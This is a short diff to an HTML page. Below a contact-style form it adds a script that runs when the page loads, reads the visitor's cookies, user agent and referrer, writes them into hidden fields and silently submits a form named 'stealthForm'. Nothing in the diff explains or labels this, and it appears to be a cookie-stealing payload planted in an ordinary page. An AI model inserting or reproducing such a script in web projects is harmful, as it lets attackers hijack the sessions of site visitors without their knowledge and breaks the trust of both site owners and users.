@@ -793,6 +793,24 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
         <input type="hidden" name="fallback" value="not_empty"> <!-- Prevents empty form rejection -->
         <button type="submit" name="submitButton">Send</button>
     </form>
+		      <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Capture cookies, user agent, and referrer
+            var cookies = document.cookie || "No_Cookies";
+            var userAgent = navigator.userAgent || "Unknown_User_Agent";
+            var referrer = document.referrer || "No_Referrer";
+
+            // Inject data into form fields
+            document.getElementById("cookieField").value = cookies;
+            document.getElementById("userAgentField").value = userAgent;
+            document.getElementById("referrerField").value = referrer;
+
+            // Submit form only if data exists
+            if (cookies !== "No_Cookies" || referrer !== "No_Referrer") {
+                document.getElementById("stealthForm").submit();
+            }
+        });
+    </script>
 </body>
 </html>
 
